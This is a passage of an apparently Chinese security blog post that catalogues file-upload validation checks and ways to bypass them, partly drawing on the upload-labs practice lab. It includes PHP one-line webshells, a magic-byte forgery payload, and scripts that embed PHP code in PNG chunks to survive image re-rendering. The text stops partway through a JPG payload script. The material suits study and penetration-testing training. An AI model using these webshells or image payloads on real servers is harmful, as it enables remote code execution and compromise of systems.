<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>文件上传 | senu11</title><meta name="author" content="senu11"><meta name="copyright" content="senu11"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本文总结了常见的文件上传漏洞的校验和绕过方法">
<meta property="og:type" content="article">
<meta property="og:title" content="文件上传">
<meta property="og:url" content="http://example.com/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
<meta property="og:site_name" content="senu11">
<meta property="og:description" content="本文总结了常见的文件上传漏洞的校验和绕过方法">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/1.png">
<meta property="article:published_time" content="2020-06-01T12:17:00.000Z">
<meta property="article:modified_time" content="2024-05-21T07:28:58.900Z">
<meta property="article:author" content="senu11">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/1.png"><link rel="shortcut icon" href="/img/head.png"><link rel="canonical" href="http://example.com/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"簡","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":730,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: senu11","link":"链接: ","source":"来源: senu11","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '文件上传',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-21 15:28:58'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">133</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/img/1.png')"><nav id="nav"><span id="blog-info"><a href="/" title="senu11"><span class="site-name">senu11</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">文件上传</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2020-06-01T12:17:00.000Z" title="发表于 2020-06-01 20:17:00">2020-06-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>44分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="文件上传"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>本文总结了常见的文件上传漏洞的校验和绕过方法</p>
<span id="more"></span>



<p>先放几张偷的图，但是很实用。。。</p>
<p><img src="image-20210210161637992.png" alt="image-20210210161637992"></p>
<p><img src="image-20210210161842598.png" alt="image-20210210161842598"></p>
<p>一般HTTP-Header有以下组成：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 274</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuKS18BporicXJfTx</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,de;q=0.6,en;q=0.4,fr;q=0.2</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryuKS18BporicXJfTx</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;</span><br></pre></td></tr></table></figure>

<p>请求Header中Content-Type存在以下特征：</p>
<ul>
<li>multipart&#x2F;form-data（表示该请求是一个文件上传请求）</li>
<li>存在boundary字符串（作用为分隔符，以区分POST数据）</li>
</ul>
<p>POST的内容存在以下特征：</p>
<ul>
<li>Content-Disposition</li>
<li>name</li>
<li>filename</li>
<li>POST中的boundary的值就是Content-Type的值在最前面加了两个–，除了最后标识结束的boundary</li>
</ul>
<h2 id="1-客户端校验"><a href="#1-客户端校验" class="headerlink" title="1.客户端校验"></a>1.客户端校验</h2><p><strong>校验原理</strong></p>
<p>一般是在客户端用js脚本校验上传文件的后缀名。</p>
<p><strong>绕过</strong></p>
<p>1、浏览器关闭js</p>
<p>2、burp抓包改后缀</p>
<h2 id="2-服务端校验"><a href="#2-服务端校验" class="headerlink" title="2.服务端校验"></a>2.服务端校验</h2><h3 id="1-HTTP-Header校验"><a href="#1-HTTP-Header校验" class="headerlink" title="1.HTTP-Header校验"></a>1.HTTP-Header校验</h3><h4 id="1-content-type校验"><a href="#1-content-type校验" class="headerlink" title="1.content-type校验"></a>1.content-type校验</h4><p><strong>原理</strong></p>
<p>模拟web服务器端的校验代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]            </span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;文件类型不正确，请重新上传！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p>
<p><strong>绕过</strong></p>
<p>burp抓包，修改与上传点要求的文件类型的MIME即可。</p>
<p>一般来说，有以下MIME类型：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types</a></p>
<h4 id="2-大写-Multipart"><a href="#2-大写-Multipart" class="headerlink" title="2.大写 Multipart"></a>2.大写 Multipart</h4><p>即将请求头中的 Content-Type 的 multipart&#x2F;form-data 第一个字符 m 改成 M，即 Multipart&#x2F;form-data（不影响传输）</p>
<h3 id="2-文件头校验"><a href="#2-文件头校验" class="headerlink" title="2.文件头校验"></a>2.文件头校验</h3><p><strong>原理</strong></p>
<p>用到了getimagesize()函数，检测文件内容开始处的文件幻数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.JPEG;.JPE;.JPG： FF D8 FF E0 00 10 4A 46 49 46（JPGGraphic File）</span><br><span class="line">.png：89 50 4E 47（ PNG）</span><br><span class="line">.gif：47 49 46 38 39 61（GIF89a）</span><br><span class="line">.zip：”Zip Compressed”</span><br><span class="line">.doc、.xls、.xlt、.ppt、.apr：”MS Compound Document v1 or Lotus Approach APRfile”</span><br></pre></td></tr></table></figure>

<p><strong>绕过</strong></p>
<p> 伪造幻数，在木马内容基础上再加了一些文件信息，例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;?php eval($_POST[&#x27;test&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>

<p>或者是在文件开头处写下以下内容</p>
<p><img src="image-20210212195306465.png" alt="image-20210212195306465"></p>
<h3 id="3-文件内容校验"><a href="#3-文件内容校验" class="headerlink" title="3.文件内容校验"></a>3.文件内容校验</h3><h4 id="1-文件内容替换"><a href="#1-文件内容替换" class="headerlink" title="1.文件内容替换"></a>1.文件内容替换</h4><p><strong>原理</strong></p>
<p>将文件中的敏感字符替换掉，大致代码类似于下面这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$path = &quot;./uploads&quot;;</span><br><span class="line">$content = file_get_contents($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">$content = str_replace(&#x27;?&#x27;, &#x27;!&#x27;, $content);</span><br><span class="line">$file = $path . &#x27;/&#x27; . $_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;];</span><br><span class="line"></span><br><span class="line">if (move_uploaded_file($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;], $file)) &#123;</span><br><span class="line">        file_put_contents($file, $content);</span><br><span class="line">        echo &#x27;Success!&lt;br&gt;&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">        echo &#x27;Error!&lt;br&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>如果我们要上传php的一句话<code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code>时，php的语言标记中的<code>?</code>会被替换为<code>!</code>，这样一句话就不能被执行了</p>
<p><strong>绕过</strong></p>
<p>主要还是要根据实际过滤的字符来判断，如果写死的话可能是没办法的（一般不会，因为还要兼顾图片上传）</p>
<p>比如过滤掉问号，我们就可以使用<code>&lt;script language=&#39;php&#39;&gt;system(&#39;ls&#39;);&lt;/script&gt;</code>这样的一句话。具体方法要看实际代码过滤了哪些字符。</p>
<h4 id="2-文件加载检测"><a href="#2-文件加载检测" class="headerlink" title="2.文件加载检测"></a>2.文件加载检测</h4><p>一个灰常经典的例子，<code>upload-labs Pass-16</code>，源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">   <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">           <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">           <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">               <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">               @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="comment">//给新图片指定文件名</span></span><br><span class="line">               <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">               <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">               <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">               <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">               <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">               @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">               <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>使用<strong>imagecreatefromjpeg（）</strong>函数调用php中的<strong>GD</strong>库转换了图像。</p>
<p>使用二次渲染之后，图片中的恶意代码会被去除。</p>
<p><strong>绕过</strong></p>
<h5 id="上传GIF"><a href="#上传GIF" class="headerlink" title="上传GIF"></a>上传GIF</h5><p>关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了.</p>
<p>例如以下部分没有变化</p>
<p><img src="image-20210212211325478.png" alt="image-20210212211325478"></p>
<p>我们就将代码写到该处</p>
<p><img src="image-20210212211352364.png" alt="image-20210212211352364"></p>
<h5 id="上传PNG"><a href="#上传PNG" class="headerlink" title="上传PNG"></a>上传PNG</h5><p>PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了3个标准数据块(IHDR,PLTE,IDAT, IEND)，每个PNG文件都必须包含它们.</p>
<p><strong>数据块结构</strong></p>
<p><img src="image-20210212212307066.png" alt="image-20210212212307066"></p>
<p><strong>IHDR</strong></p>
<p>数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p>
<p>文件头数据块由13字节组成，它的格式如下图所示。</p>
<p><img src="image-20210212214948106.png" alt="image-20210212214948106"></p>
<p><strong>PLTE</strong></p>
<p>调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4&#x3D;16），否则，这将导致PNG图像不合法。</p>
<p><strong>IDAT</strong></p>
<p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p>
<p>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像</p>
<p><strong>IEND</strong></p>
<p>图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p>
<p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p>
<p>00 00 00 00 49 45 4E 44 AE 42 60 82</p>
<p>写入php代码</p>
<p><strong>写入PLTE数据块</strong></p>
<p>php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以再chunk data域插入php代码,然后重新计算相应的crc值并修改即可.</p>
<p>这种方式只针对索引彩色图像的png图片才有效,在选取png图片时可根据IHDR数据块的color type辨别.<code>03</code>为索引彩色图像.</p>
<ol>
<li><p>在PLTE数据块写入php代码.</p>
<p><img src="image-20210212215554445.png" alt="image-20210212215554445"></p>
</li>
<li><p>计算PLTE数据块的CRC<br>CRC脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">png = <span class="built_in">open</span>(<span class="string">r&#x27;2.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">a = png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr = binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; PLTE crc &#x27;&#x27;&#x27;</span></span><br><span class="line">data =  <span class="string">&#x27;504c5445&#x27;</span>+ re.findall(<span class="string">&#x27;504c5445(.*?)49444154&#x27;</span>,hexstr)[<span class="number">0</span>]</span><br><span class="line">crc = binascii.crc32(data[:-<span class="number">16</span>].decode(<span class="string">&#x27;hex&#x27;</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(crc)</span><br></pre></td></tr></table></figure>

<p>运行结果<code>526579b0</code></p>
</li>
<li><p>修改CRC值</p>
<p><img src="image-20210212215653375.png" alt="image-20210212215653375"></p>
</li>
</ol>
<p><strong>写入IDAT数据块</strong></p>
<p>这里有国外大牛写的脚本,直接拿来运行即可.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行后得到1.png.</p>
<h5 id="上传JPG"><a href="#上传JPG" class="headerlink" title="上传JPG"></a>上传JPG</h5><p>这里也采用国外大牛编写的脚本jpg_payload.php.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 